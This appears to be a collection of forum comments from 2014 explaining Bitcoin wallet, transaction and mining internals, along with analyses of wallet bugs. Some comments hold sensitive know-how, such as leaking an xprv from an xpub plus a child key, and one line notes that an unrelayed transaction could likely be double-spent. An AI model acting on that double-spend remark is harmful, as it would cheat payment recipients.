A known 'gotcha' with BIP32 is: if you have an xpub and any non-hardened child private key, you can derive the xprv which would compromise the entire branch. That property doesn't hold if the child private key is hardened.


They're further levels in the tree, you can go as deep as you want. m/i/0/k/j/l would be the *l-th* child of the *j-th* child of the *k-th* pair of the external chain of account *i*

Sorry I thought you were saying it was testing if the wallet had ever been encrypted. I guess we were saying the same thing.


I think so. Pre-0.9 a wallet would contain 100 addresses at any point because your wallet would always be in the unlocked state whenever a new address is needed. Now in 0.9 you don't need to enter your password for a new receiving address, so it is possible to deplete the keypool a bit but unlikely unless you never enter your password.
@_date: 2014-02-14 16:25:59
Still works for me. Does it say it's blocked in your country or something?
@_date: 2014-02-22 13:34:25
It means blocks that don't have the checkpoint as an ancestor can be discarded with a very simple check and immediately forgotten about. Without checkpoints, an attacker could spam the network with an alternative chain that nodes would be obliged to temporarily store and perform much more complicated validation checks on which would waste time and resources. It prevents a type of denial of service attack.
@_date: 2014-01-12 07:37:08

@_date: 2014-10-22 22:53:52

Yes it changed. It now just pulls an address from the pool and doesn't top it up if you haven't unlocked your wallet yet. If you do this a lot eventually you will run out of keys and it will prompt to unlock.

There are ~2^256 private keys but only ~2^160 addresses, which means there are more than likely many private keys per address.
And yes there could be addresses that have no corresponding valid pub/private key pair, if SHA2 and RIPEMD hashes aren't perfectly distributed. But it's not likely and not possible to prove without brute forcing.

All Android wallets that I'm aware of were patched immediately to work around the bug even if the underlying Android OS is vulnerable.

Do a rescan on the last key, or start with -rescan option.

The address is the SHA-256 + RIPEMD-160 (usually called hash160) hash of the *public key*, with a version byte added to the front (0x00 for Bitcoin, 0x1E for Doge) and then base58check encoded. So you could use the same private key for both, which would generate the same public key, and the same hash160 value, but in encoded form the addresses will be completely different because of the version byte, checksum and base58 encoding.

I guess I just don't know what you mean by "sha256 for private keys". As OP said, a private key is just a really big number. Where do you think SHA-256 comes into that?
Creating the address from the *public* key involves both SHA-256 and RIPEMD-160, likely because 160 bits is more than enough address space, and using two algorithms protects against one of them being broken.
re: brute forcing - Bitcoin ASICs can literally only do one thing, double SHA-256 an 80-byte payload with an incrementing nonce. They would be useless for bruteforcing a private key.

The part about the Heartbleed bug that hasn't had much attention is that it's bi-directional. Most of the talk is about clients being able to read memory from a vulnerable server, but if your client is using OpenSSL the server can also use the exploit against you. This isn't a problem for browsers because they don't use OpenSSL, but Bitcoin does.
The payment protocol uses a callback URL to retrieve the payment request e.g. `bitcoin:&lt;address&gt;?amount=0.2&amp;r= If example.com is evil, they could use the Hearbleed bug against you when you connect, and read random 64 kB chunks of memory which might include private key data and other goodies if you're unlucky.

You could accept a master/extended public key instead of a single address and generate from that, but you would likely end up with big gaps of unused addresses (people that didn't end up donating). Deterministic wallets generally use gap limits to know when to stop generating new addresses. So you either need to deal with huge gap limits, or build in extra complexity in the extension to check the blockchain and recycle previous addresses that didn't end up receiving any transactions, or maybe only give a new address after a transaction is received.

Dealing with multiple addresses on a mobile device is tricky and resource-intensive. I know Mycelium is working on a solution (possibly BIP32) but it uses a central server that can do a lot of the work. I don't know if a true SPV wallet will be implementing proper change addresses any time soon.

Miners aren't *solving* SHA2 in any meaningful sense. They're just calculating hashes lots and lots of times until they find one that's valid i.e. one that's below a threshold known as the target. Mining ASICs are just highly optimised to run the SHA256 algorithm as efficiently as possible.
If SHA2 was ever solved/cracked, then Bitcoin and a lot of other systems relying on crypto would also be broken.

There are hard rules and soft rules. Your transaction is perfectly valid, but it's non-standard because of the output size but that's a soft rule to minimise spam. 'Non-standard' doesn't mean 'invalid'.
If a miner included an invalid transaction in a block (e.g. an input with an invalid signature, or a wrong amount) the block would be rejected by the rest of the network.

The algorithm to convert your seed to a list of all addresses/privkeys in your wallet is well-known and implemented in multiple places, so even if Electrum disappears you can generate all your keys using other tools.

It's been discussed to death, and so far nobody has come up with PoW that is 'useful'. The closest is Primecoin but its usefulness is debatable. Curecoin and Gridcoin claim to be useful, but in reality they rely on traditional PoW and the folding/BOINC stuff is just tacked on top and does nothing to secure the network. 
Creating a useful PoW algorithm that satisfies all the requirements of a decentralised cryptocurrency is difficult, maybe even impossible. It needs to be difficult to calculate, but easy to verify. Scaling difficulty, endless supply of work, can't be calculated in advance, incorruptible, work must be computationally tied to the data it's securing ... the list goes on.

No. It constantly tops up the pool as you use addresses so that it always contains 100 addresses.
Edit: small caveat. Since 0.9 you don't have to enter your password to use a new receiving address. Doing this doesn't topup the pool because your wallet is still locked. If you do this a lot and never make any outgoing transactions or unlock your wallet then the pool could contain less than 100 addresses.

Private keys are just a big number, they're not an x,y coordinate pair. You're thinking of the public key. Compressed private keys aren't actually compressed, they just contain a flag to indicate the compressed representation of the *public key* (and address) should be used. Compressed private keys are actually larger because of this added flag (52 vs 51 chars).
Casascius keys are "mini private keys". They contain a smaller checksum, and also less entropy than a normal private key. The series 1 coins used a 22-char key which is only around 128-bits of entropy. If OP has one of these I'd be a little bit worried but probably not enough to move the funds unless it's a large amount. Since then they use 30-char keys with entropy more than 160-bits so it's not an issue (addresses are capped at 160-bits of entropy due to the use of RIPEMD160).
Decoding a mini key is pretty much the same as a brainwallet: real key = sha256(minikey)

The soft rules only come into play when a miner decides which transactions to include in a new block from the unconfirmed pool. Miners have complete freedom to include whatever transaction they want at this point. They could ignore any transaction with an output of 0.666 for example.
But once a transaction is included in a block, everyone is obliged to accept that block so long as it adheres to the hard rules of what makes a block valid. These rules are tightly defined and any deviation from them will result in a fork in the blockchain. Which is obviously bad.
Right now, the min output is a soft rule and only serves as a deterrent instead of a restriction. If spam became such a huge problem that it was affecting the network, it's conceivable that it could be 'upgraded' to a hard rule when determining if a block is valid. But that would require consensus of the whole network.

So which wallet did you use to send this? Anything less than 5430 satoshis is considered a non-standard transaction and won't be relayed by most of the network or miners. bitcoin-qt and most wallets I'm aware of won't let you send such a tiny amount.
Check the propagation, it's non-existent. Because of this, if you import the key into a different wallet and attempt a double-spend, it has a high chance of working. Most of the network doesn't know about your transaction because it wasn't relayed.

Transaction timestamp doesn't mean a lot. Your details could have been transmitted any time after the malware was installed.

Your transaction sends 0.00000002 back to yourself as change. The amount is so tiny that most miners and nodes treat the transaction as spam/dust, flag it as non-standard and effectively ignore it. Your transaction was only mined because the Eligius mining pool is lenient and allows non-standard transactions. It took a while because Eligius only controls less than 10% of the hashrate.
Most wallets would never create a transaction like this. They would just ignore the change and the dust would become part of the transaction fee.

The best idea is to keep a backup of the QR code or secret key the sites give you when you setup 2FA. Print it off or store it encrypted somewhere. Probably a good idea to go through all your existing accounts and refresh your 2FA now while you have access to your phone.

ECDSA-256 is said have 128-bits of *effective* security i.e. equivalent to 128-bit symmetric encryption, but this has nothing to do with collisions between priv and pubkey (which don't exist). It's because there are algorithms for solving the elliptic curve discrete logarithm problem faster than brute force. Just like with RSA where for 128 bits of effective security you need a 3072 bit key. These are estimates based on current understanding and can change if better algorithms are found.
ECC pubkeys are actually 257 bits or 512 bits depending how they're encoded, but ultimately represent 256 bits of information because it's constrained by the private keyspace.
Collisions are only relevant when talking about Bitcoin addresses not pubkeys, because they use RIPEMD160 which compresses the 256-bit keyspace down to 160 bits.

Is the 1NuNVD address showing in your wallet as a receiving address? I'm guessing not.
The part in the log about 0.423 is likely for the transaction you made to Cryptsy here: 
And the balance was later drained to the unknown address here: 
If there's nothing in your log about the second transaction then this is further evidence you were hacked.

For most "normal" sites simple sniffing would be enough. But with blockchain.info the password is never transmitted to the server, it's only used client-side to decrypt the wallet. So the MITM could only get the encrypted wallet by sniffing, they'd need to inject something to gain access to the password.

No that seems right to me. It marks it invalid which means it's a provably unspendable output.
Edit: I think I see the confusion. It doesn't mean a transaction containing OP_RETURN is an invalid transaction. It's referring to the script evaluation. A output script containing OP_RETURN can never evaluate to true, so it's verifiably impossible to craft a scriptSig that can spend it.

Because the client code is open, you can verify that the only thing that ever gets transmitted to the server is the wallet in encrypted form. Private keys and passwords never touch the server, so the most they can do on the server is attempt to bruteforce your wallet password which should be impossible if it is strong enough.
If they went rogue or were compromised, it would be possible for the server to send javascript that breaks those rules though e.g. secretly uploads the unencrypted wallet or password. You should use the browser extension if you're worried about that:

The miners pushing the boundaries are effectively withholding their blocks then. In general, you want your block to be propagated and accepted as soon as possible otherwise you run the risk of it being orphaned.

There's a constant pool of unconfirmed transactions that haven't yet made it into any block. Miners choose transactions from this pool to include in the block they're trying to solve.

IsLocked() is testing if you have entered your password, not that the wallet is encrypted.
The comment you linked to is referring to a recent change in 0.9 where you don't have to unlock your wallet to create a new receiving address anymore. In this case, it does take an address from the pool without topping it up and you could deplete the pool if you created a load of new receiving addresses without first entering your password.
The code I linked to shows the behaviour when you request a new address and your wallet is unlocked, which is most of the time now and all of the time pre-0.9. The only time your wallet will contain less than 100 unused address is if you create many new receiving addresses without unlocking, and never make any outgoing tx.

@_date: 2014-10-15 11:45:44
I'm well aware of that. Go look at the coinbase transaction in pretty much any block up until around 2012 and you'll see that most of them use pay-to-pubkey and not pay-to-pubkey-hash. That was the default behaviour for people solo mining with bitcoind. These days all the pools mine to an address, but that's a relatively recent shift.
@_date: 2014-07-04 03:12:47
By default the gap limit is 5 I think, which means it will look ahead 5 unused addresses. You can change that by running
    wallet.storage.put('gap_limit', x)
on the console tab (replace x with a number obviously). Restart Electrum and you should see more addresses.
It used to be an option in the UI but they removed it for some reason.
Note if you restore from seed, you should set the gap limit the same otherwise it might not pick up all addresses in your wallet.
@_date: 2014-02-11 06:00:19
There are ~2^160 possible addresses, so the chance is 1 in 2^160 assuming your random number generator isn't faulty. It's so small it's effectively zero.
2^160 is so ridiculously huge it's difficult for us humans to contemplate. It's roughly the same scale as the number of atoms in the Earth.

@_date: 2014-02-25 15:52:52
So the total received since 2012 (not even the balance) is somewhat similar to an unconfirmed report of how much was stolen. I don't see how that's relevant at all. Speculation on top of speculation.
That address has been the subject of speculation for a long time. It's likely a tumbler or a gambling site. High volume but low balance.

A blockchain.info wallet is just a JSON string, the most important part being
    keys: [
        { addr: "1NnA...", priv: "5Jj4..." },
        { addr: "1T34...", priv: "5K3..." },
        ....
    ]
The primary password encrypts this whole string so you can't see anything inside it. The secondary password encrypts the `priv` values, so if you decrypt with the primary password you can see the addresses but the key is gibberish.
Even bitcoin-qt kind of works like this. When you password-protect your wallet, it only encrypts the private key data and leaves the addresses alone. This is why you can see your balance and transactions immediately when you open it, and only need the password when you spend.
If you encrypt your wallet.dat using gpg/openssl/whatever then you've effectively got the same system as blockchain.info with two levels of protection.

Yeah, looking at the code it's not obvious why merging hasn't been seen before now (assuming that's true?). Two possibilities I could think of:
1) The leaked code is out of date and the current code uses slightly different rules e.g. output between 1 and 10 BTC
2) The scheduled jobs are executed sequentially instead of async. If the split function always runs first it would tie up the outputs (Available = 'N') and make them unusable to the merge function when it runs immediately after.

Nonsensical question. As I said, the wallet you imported into generates a new change address for each transaction.
The problem is that the paper wallet doesn't know what this new change address is. How could it? It's just a piece of paper. It's not even really a wallet, just a single private key. Which is why you should consider a paper wallet to be 'spent' if you ever import it into a wallet. That paper wallet now belongs to the wallet you imported it into, and is no longer valid by itself. Unless of course you're using a wallet that has specific support for paper wallets e.g. Mycelium that always sends change back to the address you're spending from instead of a new address.

While block size is a concern for some miners, that's not the usual reason for completely empty blocks. When a miner receives a new block, they immediately start mining an empty block template, and then figure out which transactions to include slightly later. Sometimes they get lucky and mine a block in the gap period. This and most other empty ones I've seen are found within a few seconds of the previous block.

A rule is a rule. It's right in there with all the other block validations like checking the proof of work, block reward, contains only valid transactions etc
Why would they fuck around with timestamps if they can just increase the block reward? It's no different. Either change would be a break to the protocol, blocks would only propagate between miners with the changed rules and be dropped by the rest of the network.

The 3 just indicates it's a pay-to-script-hash (P2SH) address, it doesn't reveal what the script is. It could be 1 of 2, 2 of 4 etc. To verify you'd need to hash the script yourself and ensure it matches the address. Which would require access to all pubkeys involved.

Gridcoin is basically a Litecoin clone, it still uses scrypt as proof of work. The BOINC stuff is just tacked on top and does nothing to secure the network.
Same deal with Curecoin which uses double SHA the same as Bitcoin, with the protein folding being something separate.
Creating a 'useful' PoW algorithm is a huge challenge, there are a lot of properties it would need to fulfill. These so-called 'useful' coins are a distraction, maybe even deceitful. The closest anyone has come to a proof of work algorithm that does 'useful' work is Primecoin, and it's debatable what use those prime numbers have outside of being a mathematical curiosity.

Do you mean a single seed but using two different passphrases that effectively results in two different wallets? If the seed is compromised you're then only protected by the passphrase, so it depends how strong that is.

There's a per-output minimum enforced to prevent spam. Before 0.9 it was 5460 satoshis but it's now 546 in 0.9 by default. If your transaction has outputs smaller than that then it won't be propagated by most nodes.
Eligius is the only pool that I'm aware of that will mine non-standard transactions. If your transaction gets to them and you include an adequate fee then it's likely to get mined eventually. Seems to be what happened with the tx you linked. You can push directly to them here:

Armory does pre-generate 100 addresses in advance, as a kind of lookahead of addresses to monitor, but that doesn't really affect backups. When you restore a wallet from the seed, it will generate the addresses in blocks of 100, and keep going until it finds a block that hasn't been used yet (no transactions in the blockchain). If for some reason there's a large gap of addresses that were unused, you can force it to keep looking. But this usually shouldn't happen.
Electrum does much the same, but uses a much smaller pool/[gap limit]( of 5 I think.

I'd advise against doing this. It would work for a while, but eventually the wallets would start to diverge because they'll generate new addresses that aren't in the other wallet. At that point you'll have two distinct wallets that each need their own backup.
I guess you could do it if you treat one wallet as a master, and copy it to the other from time to time. But it's error-prone and a good way to lose funds if you don't know what you're doing.
Deterministic/HD wallets like Electrum, Mycelium etc are safe to use on multiple devices though. You're guaranteed to always have the same addresses in each copy of the wallet (excluding keys you manually import of course).


Importing just adds the keys to the wallet but doesn't move anything. What you're describing is usually called 'sweeping' and only a few wallets offer that functionality.

I just tested on my PC and 100,000 rounds of SHA-256 takes ~100ms. That doesn't sound like much but it's a huge slowdown considering each guess would be sub-millisecond without it. 1000 keygens took 500ms without stretching, 100 seconds with.
Note that SHA-256 can be easily parallelised and can be executed much faster on a graphics card or an ASIC. Scrypt is designed to make that much harder. With the same Scrypt params that BIP38 uses, each attempt took just under 2 seconds.

I don't think there's proof that was the intention. It's definitely a nice side-effect, but the hashing could also just be for shortening and saving space in the blockchain. 160 bits vs 520 uncompressed or 264 compressed.

It's slower because the blockchain download is currently sequential, downloading a block at a time from a single node, verifying then moving on to the next block.

It's topped up every time a new address is used, so it's a constant pool of 100 addresses which means a backup at any point will have a buffer of 100 unused addresses. If it didn't do this and only topped up occasionally, you could get unlucky and create a backup that's only good for a few addresses.

It's a spam prevention mechanism basically. bitcoin-qt avoids the situation by choosing better inputs that won't leave a tiny amount of change, or if that's not possible it just adds the leftover amount to the fee. I guess the blockchain.info wallet is lacking that logic.
I pushed the tx to Eligius - they accept non-standard txs so it should be confirmed in the next block they mine.
Failing that, you would probably have to wait for blockchain.info to "forget" about the tx, and then send it again but manually add the leftover to the fee yourself. Also raise a ticket with them, because this shouldn't happen and sounds like a bug.

Well I know when the malleability DoS attack was in full force, one of my outgoing transactions was 'cloned' and it showed twice in my wallet (and affected my balance).

The security risks are largely theoretical, but it does open you up to some potential exploits.
For example, the Android SecureRandom bug was only an issue because of address re-use. The only people that lost funds were those who sent multiple transactions from the same address, which combined with the bad random number generator allowed the private key to be calculated. Spreading your funds across multiple addresses could also limit the damage caused by other RNG bugs.
Also when you spend from an address, your public key is published in the transaction and now you are protected only by Elliptic Curve cryptography. If a flaw is discovered in ECC or quantum computing becomes viable, the remaining funds on that address are vulnerable. Addresses that haven't been spent from are protected by SHA-256 and RIPEMD-160 as well as ECC, and it's ridiculously unlikely that all 3 would be compromised at the same time.
The above is purely a theoretical risk. In the unlikely event that ECC was compromised suddenly instead of incrementally, there'd be bigger things to worry about than Bitcoin.
@_date: 2014-05-19 19:18:27
Step 4: Adding a version number effectively creates a namespace so that real addresses aren't mixed up with testnet addresses. The end result is that addresses start with 1 and testnet addresses start with m or n. There's also a different version code for Pay-to-script-hash addresses (multisig etc) which is why they start with 3.
Altcoins also use different version bytes for the same reason. This makes it impossible to accidentally send Bitcoins to a Dogecoin address for example (assuming your wallet does the correct validation).
Steps 5 - 8: these are for generating the 4-byte checksum which ultimately becomes the last few characters of the address. It's for error checking, to prevent typos basically. If you modify or omit a single letter of an address, the checksum will not match and the address is invalid. The chance that a mistyped address is wrongly treated as valid is 1 in over 4 billion (2^32). As for why the checksum uses double-SHA instead of single, I don't know. Double-hashing is common in the crypto world because it prevents certain types of attacks (length extension) but I don't see how that's relevant for a checksum.
Step 9: Encode to base58. At this point we just have a longish hex string. Encoding to base58 means the same number can be represented with less characters. 0OIl are excluded because they look too much alike.
Satoshi's comment in the code: 
    // Why base-58 instead of standard base-64 encoding?
    // - Don't want 0OIl characters that look the same in some fonts 
    // and could be used to create visually identical looking account numbers.
    // - A string with non-alphanumeric characters is not as easily accepted as an account number.
    // - E-mail usually won't line-break if there's no punctuation to break at.

I think the idea has merit, but two initial thoughts come to mind:
In the period between receiving the header and the tx data, it would be impossible to decide which transactions to include in the next block since we don't know what the block actually contains. So you'd probably have to start mining an empty block during this period.
Potential new attack vector: bad miner transmits the header with no intention of transmitting the transactions later. Miners are tricked into doing useless work. I haven't thought out the incentives for this, I suspect it would be against their own interests, but still needs to be considered.

The number of addresses is irrelevant. What matters is the number of unspent outputs in your wallet i.e. how many transactions you have received. The more you have the larger the transaction will be (in kilobytes) and the bigger recommended fee would be since it's per-kilobyte.

Technically BIP32 allows for that through the concept of hardened keys i.e. keys with index &gt; 2^31. These keys' addresses can't be derived using the xpub.
BIP44 uses hardened key derivation down to the account level, but within the account uses non-hardened keys. If you don't want the mpk functionality, it would be possible for a wallet to use only hardened keys but I'm not aware of any that currently have that option.

Why hasn't this transaction confirmed?
It has a fee of 0.0004 which is more than recommended for a 2971 byte transaction. It has no dust outputs. Not a double spend. Rebroadcasting hasn't helped.
What am I missing? I thought I understood tx fees well, and usually I'm in the position of helping others with their unconfirmed transactions, but this has me stumped.
This isn't my transaction, but a payment sent to me is dependent on it. There's a huge chain of unconfirmed transactions dependent on it.

I explained this a couple of weeks ago but I think you deleted your throwaway before you saw my post.
This transaction from way back in March is messing things up: 
Note this is around the time of the blockchain fork and apparently blockchain.info didn't resolve their internal database properly. The transaction doesn't actually exist anywhere outside of blockchain.info. It's not in the blockchain, and it's artificially inflating your balance.
Looks like the same bug as [here]( where an address balance was negative, but for you it's in the opposite direction. If you look at your address on blockexplorer it has the correct balance: 
Definitely contact blockchain.info support.

Add `?format=hex` to the end of your tx URL to get the raw transaction data.
Copy the hex string and in bitcoin-qt/bitcoind or other wallet run `sendrawtransaction &lt;pastehexstringhere&gt;`
There are also some web-based pushtx forms
 (this one wouldn't have helped since blockchain.info already knew about the tx and would reject it as a duplicate)
Doubt it's anything to do with malleability. It seems to have started during and after blockchain.info's recent downtime.

Not sure what you mean. When you spend from most wallets, the change is sent to a new address that is generated just for that transaction. For bitcoin-qt it's a new random address, for Electrum/Armory it's a new address deterministically derived from the seed. But that's pretty much irrelevant here. The important part is that the change is now sitting at a new address and your paper wallet balance is likely zero.

I modified the localStorage to use an address I don't own. I didn't want to risk my own funds :)
Used this address: 1M2s6Ag9ctjT4MR66RZsWsvb6tPCbTmB5t which has a single 3.75 BTC unspent output.
[Went to send, entered 1,111 as the amount]( In Firefox this is parsed as 1.0. Chrome says NaN. Both browsers allow the transaction to proceed.
[The confirmation screen says it's sending 3.75158326 BTC]( i.e. the entire input amount. The transaction that it generates has a single output of 1 BTC, with the remainder going to fees, and this seems to match the linked txns exactly.

Right now you're at a huge risk of losing all the funds if you don't move them immediately. I would think that would be a bigger pain in the arse. Do that, sort out the mess later imo. If you do manage to regain access to the keys, you can just refund each address with their correct balance.

Ultraprune was more about how the data is stored and indexed on your filesystem and didn't affect the network/download side of things. It lay the groundwork for the possibility of pruning and more efficient syncing but that hasn't been taken advantage of yet.

Blockchain pruning is an ongoing discussion and I guess it's a lower priority than other things being worked on at the moment.

Opportunity cost. If they mine using solar, that still has a cost roughly equal to what they'd get by selling it to the grid instead of mining with it.

In the first transaction, you sent 6.7 BTC to that address. You might have thought you sent 12.7, but you didn't. The blockchain doesn't lie. Since you were sending TO this address using your local wallet, it's impossible for blockchain.info to be at fault  here.

A bitcoin-qt wallet maintains a pool of 100 unused pre-generated addresses. When you encrypt your wallet, it flags those as unusable and generates a new pool. Your old backup doesn't contain these new address, so it's useless from a backup point of view. It's not useless to an attacker if any of the addresses from before encrypting contain funds.

Scrypt has parameters that control how CPU and memory-intensive the algorithm is. Litecoin uses n=1024, p=1, r=1 where r controls the memory cost. LTC's params are quite 'weak' and that's why GPU mining happened so quickly and why ASIC mining may happen soon. But because of the memory requirements, it's unlikely the gains from ASICs will be anything like what Bitcoin saw.
BIP38 uses much stronger parameters and is orders of magnitude slower. n=16384, r=8, p=8. If ASICs become a reality, they will be tuned to LTC's params and would likely be useless for BIP38 cracking.

It shouldn't be possible regardless of how many keys you have, unless the key derivation algorithm is very naive. Electrum and BIP32 use ECC in combination with a hash function which means each key you generate is indistinguishable from random. There's no discernible connection between keys unless you know the parent/master key.

This is only really a concern for embedded devices that have no reliable external source of entropy and no persistence between reboots e.g. a router.
A typical Live CD boot will have access to user input (keyboard + mouse), hardware interrupts from other devices etc. more than enough for 256-bits of entropy during or soon after booting.

Because there are other "known" things in the encrypted data you could use other than private keys. e.g. say the encrypted data contained `key1=&lt;keydata&gt;` then using "key1" as the known data would be just as effective as using the key itself.

Well you're free to think there's some grand purpose, but to me that's just conspiracy theory nuttiness and I'm not going there.
The tl;dr version is: all this "useless" work that miners do makes it ridiculously hard to undo transactions once they've been mined and added to the blockchain. The less work that is done, the easier it would be for someone else with lots of processing power to come along and rewrite history and generally fuck things up.
You said you accept that Bitcoin has value because people use it. Bitcoin's security and existence is dependent on sufficient work being done such that bad actors can't come along and mess things up. Miners are rewarded for the job they do securing the network. It's really that simple.

They're rejected as invalid by the network and never make it to the memory pool. It's not like they just hang around until they eventually confirm. They would need to be re-broadcasted.

I'm more worried about it being cryptographically strong than being an outright scam.
New crypto schemes don't come about from some guy waking up with a 'radically amazing idea', implemented as a black box device. Unless it has been publicly vetted by the cryptographic community, there's zero reason to trust it's actually secure. 
Your posting history is 100% about this project so I'm assuming you're involved in some way. Can you tell us what kind of cryptanalysis has been done? What cryptographic credentials does the creator have? 
It might truly be a revolutionary new form of encryption, but it's not going to gain acceptance unless it can be proven. If you're determined to stay closed-source, I think your only option is patents and/or sharing your idea with large industry backers willing to sign NDAs.

re: your edit, did my answer to clear anything up?
I think maybe you're working with the false assumption that a paper wallet somehow defines a change address as well? That's not the case. A paper wallet isn't even a wallet really, it's just a paper representation of a single private key/address combo. People who don't understand change addresses can get into trouble when they import their paper wallet and make a transaction. The change is now on an address that the paper wallet doesn't 'know' about (how could it, it's just a piece of paper). The change address has no connection to the paper wallet address. Those funds now belong to the wallet you imported into.
Have you read this: 
When you said you understood change, I thought you meant you understood how paper wallets can be dangerous because of change addresses.
@_date: 2014-11-19 03:41:35
The address must have received multiple transactions in the past. Transactions work on outputs and inputs, addresses don't really have a "balance".
e.g. the address has received 1 BTC and 0.4 BTC. You want to spend 0.3 BTC. Only the 0.4 BTC output is used, leaving 1 BTC still remaining on the address and 0.1 BTC to the change address.

I think your merging of terms confuses things a little. There is a pubkey derived from the private key, and an address derived from the pubkey. All 3 are important to the protocol. Conflating addresses with public keys is often used in basic Bitcoin primers, but it just creates confusion in my opinion.

Mycelium does it right. It will blow up if /dev/urandom doesn't exist or can't be read.
The bitcoinj version has been updated today to be more strict, I guess in response to this issue. It will now throw an exception if /dev/urandom can't be read.
Schildbach wallet potentially falls back to default SecureRandom, which is weak on older Android versions. They're not messing around with setSeed or random.org so the effect wouldn't be as disastrous as bc.info's bug.
and any comments?
As I see it, this bc.info bug could only have happened if
1) /dev/urandom didn't exist, or  
2) the call to Security.insertProviderAt() didn't work as expected and the custom provider didn't actually register
Whichever it is, it's very rare based on the number of people affected, but both cases should be guarded against IMO.
\*edit A third possibility: /dev/urandom was returning all zeros, which when XORd with the seed from random.org would return just the seed.

Gox transactions started failing after 0.8 because of the tighter rules, but malleability has always been a 'problem'.

Does the balance agree with what blockchain.info shows for your address? If it does, then sounds like you were trying to spend coins you never had i.e. Multibit was out of sync with the blockchain.

@_date: 2014-01-09 20:08:20
Not sure if it's a bug or user error, but there's two problems with the transaction.
The fee is 0.00009999 BTC instead of 0.0001. Rounding error?
Also it is sending change of 0.00000001 back to the sending address. This amount is less than the minimum allowed output size of 0.00005430 so it's a non-standard transaction and will have a very low priority and may not ever confirm. This one sounds like a bug .. a wallet shouldn't let this happen or should at least show a warning.
The two issues are likely related, since they add up to 0.0001 which is the fee you were trying to send.

True, the recovery process isn't ideal. The words are shuffled and some red herrings thrown in, but it still weakens the security significantly. Ideally you should be able to enter the seed on the device. With only two buttons it would be painfully slow and cumbersome but it's not like you'd need to do it often.

I was in the middle of writing a breakdown of what went wrong, but you've beat me to it.
Basically, they have a LinuxSecureRandom class that's supposed to override the standard SecureRandom. This class reads from /dev/urandom and should provide cryptographically secure random values.
They also seed the generator using SecureRandom with data pulled from random.org. With their custom SecureRandom, this is safe because it mixes the entropy using XOR, so even if the random.org data is dodgy it won't reduce security. It's just an added bonus.
BUT! On some devices under some circumstances, the LinuxSecureRandom class doesn't get registered. This is likely because /dev/urandom doesn't exist or can't be accessed for some reason. Instead of screaming bloody murder like any sensible implementation would, they just ignore that and fall back to using the standard SecureRandom.
If the above happens, there's a problem because the default implementation of SecureRandom doesn't mix. If you set the seed, it replaces the entropy entirely. So now the entropy is coming solely from random.org.
And the final mistake: They were using HTTP instead of HTTPS to make the webservice call to random.org. On Jan 4, random.org started enforcing HTTPS and returning a 301 Permanently Moved error for HTTP - see  So since that date, the entropy has actually been the error message (turned into bytes) instead of the expected 256-bit number. Using that seed, SecureRandom will generate the private key for address 1Bn9ReEocMG1WEW1qYjuDrdFzEFFDCq43F 100% of the time. Ouch. This is around the time that address first appears, so the timeline matches.
I haven't had a thorough look at what they've replaced it with in the latest version, but initial impressions are that it's not ideal. Not disastrous, but not good.

I've also been looking at this. So far it seems to be very basic key splitting. 
The first 160 bits is the address.
Next 2 bytes indicate the encoding used. e.g. `0101` is 1-of-1, `0202` means 2-of-2 etc

There are things in the block header that will vary between miners, e.g. the merkle root will be different because of the coinbase/payout address, extraNonce and the number and order of transactions. Timestamp is likely to vary too. Which means each miner is solving a different puzzle so it doesn't matter if they all start with the same nonce.
Miners are so fast now that they very quickly run out of nonces anyway (it's only a 32-bit number), and so they need to regularly tweak the block and start over.

Mining is a random process subject to [variance]( The difficult adjustment aims for 10 minutes *on average*, but it's fairly common to see a few blocks in quick succession. Occasionally it takes over an hour for a single confirmation. Looks at the recent blocks at blockchain.info and you'll see the variance.


No. After the first confirmation, network propagation is irrelevant.

Electrum doesn't do this. Are they using any plugins? Might be some third party service plugin that is collecting a fee. Or their client is compromised by something that's skimming tiny amounts off the top of each transaction, but that seems like an unlikely and ineffective way to hack someone.

You can't even reliably determine the origin IP address of a block. Blocks are the same as transactions, the most you can tell is which node relayed the block *to you* and that won't necessarily be the origin node. If your node is well-connected (like blockchain.info is) you can make some educated guesses though.
Pools are identifiable on blockchain.info because they want to be. Either they mine to a known address, or they include a known signature in the coinbase.

Ideally if you just used it as an exchange, your funds would only be at risk briefly during the trade. But some people used Mt Gox like a bank or online wallet and just left their BTC there.

I would prefer to at least be warned if there may be a problem instead of just silently falling back to something that's potentially weak. It's good that you'll be doing that now.


Maybe true, but even the API documentation states 


So it seems like it could differ between implementations.
If you look at the code the Android team released for the 2013 SecureRandom bug, they do some sanity checks after registering the Provider to ensure it actually worked. Seems like a sensible thing to do.


Which is why I like how Mycelium doesn't depend on the provider framework at all. One less thing that can go wrong. Now that you're using RFC6979, how many other places do you need randomness besides generating a seed?

An ECC public key is a point on a curve. In uncompressed form it is represented by two 256-bit coordinates *x,y* so 512 bits in total. There's a 1-byte prefix added which pads it out to 520 bits = 65 bytes.
Compressed keys take a shortcut and only specify the *x* coordinate plus a 1-bit flag indicating which side of the symmetrical curve the point is on, which allows *y* to be derived. So 257 bits plus a prefix that pads it to 264 bits = 33 bytes.
Private keys however are 256 bits.

I thought maybe the wiki was out of date, but looking at the code it still seems to be the case: 
Originally, that was how all transactions worked. The send to address functionality came later. The first 'real' transaction only uses OP_CHECKSIG: 
I don't know why they've kept that behaviour for coinbase transactions though. Looking at all the recent blocks, the pools are sending to an address and not the pubkey. It will probably only be solo miners using standard bitcoind that still send to pubkey.
@_date: 2014-07-16 16:27:19
Yes that's correct. All of these transactions are using P2PH for the *outputs*, there's no pubkey in the outputs. That's how it's meant to be done. But when spending, the pubkey must be included in the *input* script regardless.

Blocks are verified as they're downloaded. Unless you have a very slow connection, verification becomes the bottleneck towards the end. With bootstrap, your CPU is twiddling its thumbs most of the time.

When a ~~miner~~ some miners* start a new block, they initially start mining an empty template and fill in the transactions soon after. It takes time to recalculate which transactions to include, and every millisecond counts.
blockchain.info is lying about the received time. Not sure when it changed, but lately the received time is just the block timestamp, they're always exactly the same. According to my logs these blocks were received just seconds apart.
\* I don't have irrefutable proof of this, I don't know what code they're running. But every time I see an empty block it's one that has come very soon after the previous block.

No*body* chooses the difficulty/target, it's adjusted by the network every 2016 blocks based on how long it took to create those blocks.


I'm not sure why you think this. Mining doesn't produce anything of value (outside of Bitcoin itself). It's not intended to produce useful or interesting data. Its only function is to secure the Bitcoin network.


The Bitcoin hashrate is currently over 250 Petahashes. That's over 250,000,000,000,000,000 hashes calculated every second. Every 10 minutes, ONE of those hashes is stored in the blockchain. The rest are discarded immediately after they're calculated because they're irrelevant, and it would be infeasible to store them anyway. That one hash is completely uninteresting outside of Bitcoin, its only function is to cryptographically prove that work was done.

